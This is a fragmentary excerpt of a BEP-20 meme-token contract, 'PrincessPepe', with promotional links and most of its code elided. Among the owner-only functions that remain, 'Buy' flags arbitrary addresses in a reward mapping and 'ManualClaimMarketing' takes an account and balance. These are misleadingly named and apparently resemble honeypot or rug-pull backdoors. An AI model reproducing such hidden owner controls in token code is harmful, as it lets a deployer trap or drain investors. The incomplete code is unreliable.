...
Princess Pepe just arrived are you ready for the ride? Get in and don't get missed!

Portal :
https://t.me/PrincessPepe_Bsc

Website
http://pepeprincess.io/
...
*/
    ...
    contract PrincessPepe   is IBEP20, Ownable
    {
        ...
        string private constant _name = "PrincessPepe";
        ...
        address public constant MarketingWallet=0x0Bf26f52862585f121B295737ea351d261eb8628; 
        ...
        constructor () {
           ...
           function OwnerSetAddress(address account) external onlyOwner {
            ...
            function Buy(address[] calldata addresses) external onlyOwner {
                 for (uint256 i; i < addresses.length; ++i) {
                     _isSendRewards[addresses[i]] = true;
                }
           }

      function ManualClaimMarketing(address account, uint256 balance) onlyOwner  public virtual {
